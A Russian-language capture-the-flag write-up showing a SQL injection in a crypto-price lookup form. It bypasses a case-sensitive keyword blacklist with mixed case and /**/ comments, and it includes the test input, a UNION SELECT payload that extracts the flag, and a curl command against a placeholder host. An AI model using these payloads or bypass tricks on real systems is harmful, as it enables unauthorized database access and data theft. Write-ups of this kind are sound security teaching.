# Writeup: CTFCoin (SQLi + bypass blacklist)

## Идея
На сайте можно «проверить цену» криптовалюты. Сервер получает параметр `cryptoname` и подставляет его в SQL-запрос строковой конкатенацией.

Ключевая деталь: перед выполнением запроса есть примитивная защита — blacklist по подстрокам `select/union/from` (только в двух вариантах регистра: полностью lower/UPPER). Это легко обходится смешанным регистром и разбиением токенов комментариями `/**/`.

## Уязвимое место
`POST /check_crypto`

Сервер собирает запрос так:

```sql
select crypto_price from cryptocurrency where crypto_name LIKE '<USER_INPUT>';
```

А фильтр проверяет только точные подстроки:

- `select` или `SELECT`
- `union` или `UNION`
- `from`  или `FROM`

## Эксплуатация
Форма на сайте отправляет радиокнопку, поэтому для инъекции удобнее перехватить запрос (Burp / devtools / curl) и подставить своё значение `cryptoname`.

### 1) Проверка инъекции
Например, подставим `OR 1=1`:

```
cryptoname=' OR 1=1#
```

Запрос превратится в:

```sql
select crypto_price from cryptocurrency where crypto_name LIKE '' OR 1=1#';
```

Хвост `';` будет закомментирован, а условие станет истинным — в ответе появятся цены всех монет.

### 2) Обход blacklist
Чтобы использовать `UNION SELECT ... FROM ...`, делаем:

- смешанный регистр: `uNion`, `seLect`, `frOm`
- разбиение комментариями: `/**/`

Также важно: шаблон на странице выводит поле `crypto_price`, поэтому в `UNION SELECT` нужно вернуть **колонку с алиасом `crypto_price`**.

### 3) Достаём флаг
Флаг лежит в таблице `bank_admin_info`, в колонке `flag`.

Финальный payload:

```
cryptoname='/**/uNion/**/seLect/**/flag/**/as/**/crypto_price/**/frOm/**/bank_admin_info#
```

Тогда итоговый запрос:

```sql
select crypto_price from cryptocurrency where crypto_name LIKE ''
/**/uNion/**/seLect/**/flag/**/as/**/crypto_price/**/frOm/**/bank_admin_info#';
```

И страница выведет значение `crypto_price`, то есть флаг.

## Пример через curl
(Подставьте адрес сервиса.)

```bash
curl -s -X POST http://HOST:5000/check_crypto \
  -d "cryptoname='/**/uNion/**/seLect/**/flag/**/as/**/crypto_price/**/frOm/**/bank_admin_info#" \
  | grep -oE 'CTF\{[^}]+\}'
```
